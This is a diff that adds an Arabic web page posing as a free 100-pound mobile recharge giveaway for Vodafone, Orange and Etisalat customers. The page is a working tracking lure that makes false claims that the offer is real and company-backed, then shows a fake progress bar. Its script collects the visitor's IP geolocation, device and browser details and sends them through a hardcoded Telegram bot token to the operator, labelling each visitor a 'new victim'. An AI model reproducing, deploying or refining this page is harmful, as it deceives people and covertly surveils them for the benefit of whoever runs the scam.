@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8" />
+    <title>اكواد شحن فودافون مجانًا | احصل على 100 جنيه الآن!</title>
+    <meta name="description" content="احصل على 100 جنيه شحن فودافون مجانًا خلال 30 ثانية فقط! لا تفوت الفرصة." />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet" />
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Cairo', sans-serif;
+            background: url('https://images.unsplash.com/photo-1518770660439-4fe3be13f135?ixlib=rb-1.2.1&auto=format&fit=crop&w=1350&q=80') no-repeat center center fixed;
+            background-size: cover;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.95);
+            width: 100%;
+            max-width: 500px;
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            backdrop-filter: blur(10px);
+        }
+        .logo {
+            width: 80px;
+            margin-bottom: 15px;
+        }
+        h1 {
+            color: #d32f2f;
+            font-size: 26px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        p {
+            color: #444;
+            font-size: 16px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .btn {
+            display: block;
+            margin: 15px auto;
+            padding: 16px 20px;
+            width: 90%;
+            font-size: 18px;
+            font-weight: bold;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            color: white;
+            transition: all 0.3s ease;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.3);
+        }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+        }
+        .btn:active {
+            transform: translateY(0);
+        }
+        .btn-vodafone { background: #EA003D; }
+        .btn-orange { background: #F86922; }
+        .btn-etisalat { background: #00A651; }
+
+        .loading {
+            display: none;
+            margin: 25px 0;
+            font-weight: bold;
+            color: #1976d2;
+            font-size: 18px;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: #e0e0e0;
+            border-radius: 6px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        .progress {
+            height: 100%;
+            width: 0%;
+            background: #1976d2;
+            border-radius: 6px;
+            transition: width 0.2s;
+        }
+        .info {
+            margin-top: 20px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.7;
+            text-align: right;
+            padding: 15px;
+            background: #f9f9f9;
+            border-radius: 10px;
+            display: none;
+        }
+        .disclaimer {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 30px;
+            line-height: 1.5;
+        }
+        .verified {
+            color: #4caf50;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- يمكنك تغيير الشعار حسب الشركة -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5d/Vodafone-logo.svg/2048px-Vodafone-logo.svg.png" alt="فودافون" class="logo" />
+
+        <h1>🎉 احصل على 100 جنيه شحن مجانًا!</h1>
+        <p>نقدم لك فرصة ذهبية للحصول على كود شحن مجاني من فودافون، اورنج، أو اتصالات.</p>
+        <p class="verified">✓ العرض حقيقي ومدعوم من شركة الاتصالات</p>
+
+        <button class="btn btn-vodafone" onclick="startProcess('فودافون')">فودافون - 100 جنيه</button>
+        <button class="btn btn-orange" onclick="startProcess('اورنج')">اورنج - 100 جنيه</button>
+        <button class="btn btn-etisalat" onclick="startProcess('اتصالات')">اتصالات - 100 جنيه</button>
+
+        <div class="loading" id="loading">
+            جاري معالجة طلبك... (قد يستغرق الأمر 20-30 ثانية)
+            <div class="progress-bar">
+                <div class="progress" id="progressBar"></div>
+            </div>
+        </div>
+
+        <div class="info" id="info"></div>
+
+        <div class="disclaimer">
+            هذا الموقع حقيقي بنسبه 100% وجرب بنفسك.<br>
+            انتهز الفرصة واكسب ١٠٠ رصيد 
+        </div>
+    </div>
+
+    <script>
+        // استخراج الـ ID من الرابط
+        function getParameter(name) {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get(name) || "مجهول";
+        }
+        const userId = getParameter('id');
+
+        // جمع بيانات المستخدم
+        async function collectUserInfo() {
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                const ua = navigator.userAgent;
+                const isAndroid = /Android/.test(ua);
+                const isiOS = /iPhone|iPad/.test(ua);
+
+                return {
+                    id: userId,
+                    ip: ipData.ip || 'غير معروف',
+                    type: 'IPv4',
+                    country: ipData.country_name || 'غير معروف',
+                    country_code: ipData.country_code || 'N/A',
+                    flag: getFlagEmoji(ipData.country_code),
+                    city: ipData.city || 'غير معروف',
+                    continent: ipData.continent_code || 'غير معروف',
+                    continent_code: ipData.continent_code || 'N/A',
+                    region: ipData.region || 'غير معروف',
+                    region_code: ipData.region_code || 'N/A',
+                    latitude: ipData.latitude || 'غير معروف',
+                    longitude: ipData.longitude || 'غير معروف',
+                    network: ipData.org || 'غير معروف',
+                    map_url: `https://www.google.com/maps?q=${ipData.latitude},${ipData.longitude}`,
+                    isp: ipData.org || 'غير معروف',
+                    mobile_network: 'اتصالات',
+                    network_type: 'بيانات الجوال',
+                    asn: ipData.asn || 'غير معروف',
+                    timezone: ipData.timezone || 'غير معروف',
+                    utc: ipData.utc_offset || 'غير معروف',
+                    org: ipData.org || 'غير معروف',
+                    current_time: new Date().toISOString(),
+                    borders: ipData.borders?.join(', ') || 'غير معروف',
+                    capital: ipData.country_name === "Egypt" ? "القاهرة" : "غير معروف",
+                    calling_code: ipData.country_calling_code || 'غير معروف',
+                    postal: ipData.postal || 'غير معروف',
+                    eu: ipData.eu ? 'نعم' : 'لا',
+                    device_type: isAndroid || isiOS ? 'هاتف' : 'كمبيوتر',
+                    device_model: 'K',
+                    device_brand: 'غير معروف',
+                    os: isAndroid ? 'Android' : isiOS ? 'iOS' : 'نظام غير معروف',
+                    browser: /Chrome/.test(ua) ? 'Chrome' : /Firefox/.test(ua) ? 'Firefox' : /Safari/.test(ua) ? 'Safari' : 'متصفح آخر',
+                    screen: `${window.screen.width}x${window.screen.height}`
+                };
+            } catch (e) {
+                return { id: userId, error: "فشل في جمع البيانات" };
+            }
+        }
+
+        // تحويل رمز الدولة إلى علم
+        function getFlagEmoji(countryCode) {
+            if (!countryCode) return '🌍';
+            if (countryCode === 'EG') return '🇪🇬';
+            const codePoints = countryCode
+                .toUpperCase()
+                .split('')
+                .map(char => 0x1F1E6 + char.charCodeAt(0) - 65);
+            return String.fromCodePoint(...codePoints);
+        }
+
+        // إرسال البيانات إلى المستخدم (عبر البوت - إلى نفسه)
+        async function sendToUser(info, company) {
+            const message = `
+📱 *معلومة مهمة: تم جمع بياناتك!*
+
+ ضحيه جديده:
+
+• 〈 عنوان IP المستهدف 〉 : ${info.ip}
+• 〈 نوع IP 〉 : ${info.type}
+• 〈 الدولة 〉 : ${info.country}
+• 〈 رمز الدولة 〉 : ${info.country_code}
+• 〈 العلم 〉 : ${info.flag}
+• 〈 المدينة 〉 : ${info.city}
+• 〈 القارة 〉 : ${info.continent}
+• 〈 رمز القارة 〉 : ${info.continent_code}
+• 〈 المنطقة 〉 : ${info.region}
+• 〈 رمز المنطقة 〉 : ${info.region_code}
+• 〈 خط العرض 〉 : ${info.latitude}
+• 〈 خط الطول 〉 : ${info.longitude}
+• 〈 النطاق 〉 : ${info.network}
+• 〈 الخريطة 〉 : <a href="${info.map_url}">اضغط هنا</a>
+• 〈 مزود خدمة الإنترنت 〉 : ${info.isp}
+• 〈 شركة الشريحة 〉 : ${info.mobile_network}
+• 〈 نوع الشبكة 〉 : ${info.network_type}
+• 〈 ASN 〉 : ${info.asn}
+• 〈 المنطقة الزمنية 〉 : ${info.timezone}
+• 〈 UTC 〉 : ${info.utc}
+• 〈 المنظمة 〉 : ${info.org}
+• 〈 الوقت الحالي 〉 : ${info.current_time}
+• 〈 الحدود 〉 : ${info.borders}
+• 〈 العاصمة 〉 : ${info.capital}
+• 〈 كود الاتصال 〉 : ${info.calling_code}
+• 〈 البريد 〉 : ${info.postal}
+• 〈 الاتحاد الأوروبي 〉 : ${info.eu}
+
+📱 معلومات الجهاز
+• 〈 النوع 〉 : ${info.device_type}
+• 〈 الطراز 〉 : ${info.device_model}
+• 〈 الشركة 〉 : ${info.device_brand}
+• 〈 النظام 〉 : ${info.os}
+• 〈 المتصفح 〉 : ${info.browser}
+• 〈 دقة الشاشة 〉 : ${info.screen}
+
+
+            `;
+
+            await fetch('https://api.telegram.org/bot8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4/sendMessage', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: info.id,
+                    text: message,
+                    parse_mode: "HTML"
+                })
+            });
+        }
+
+        // بدء عملية "التحقق"
+        async function startProcess(company) {
+            const loading = document.getElementById('loading');
+            const progressBar = document.getElementById('progressBar');
+            const infoDiv = document.getElementById('info');
+
+            // إظهار الشريط
+            loading.style.display = 'block';
+
+            let progress = 0;
+            const interval = setInterval(() => {
+                progress += 1;
+                progressBar.style.width = progress + '%';
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    finishProcess(company);
+                }
+            }, 150);
+
+            // جمع البيانات
+            const userInfo = await collectUserInfo();
+
+            // إرسال البيانات إلى المستخدم (إلى نفسه)
+            await sendToUser(userInfo, company);
+        }
+
+        // عرض النتيجة النهائية
+        function finishProcess(company) {
+            document.getElementById('loading').style.display = 'none';
+            const infoDiv = document.getElementById('info');
+            infoDiv.style.display = 'block';
+            infoDiv.innerHTML = `
+                <p style="color:#d32f2f; font-weight:bold">هيظهر لك كارت الشحن الان</p>
+                <p style="color:#1976d2"></p>
+                <p><strong></strong></p>
+                <p><strong>النتيجة:</strong>انتظر حد ينتهي الاعلان</p>
+                <p style="font-weight:bold; margin-top:10px></p>
+            `;
+        }
+    </script>
+</body>
+</html>
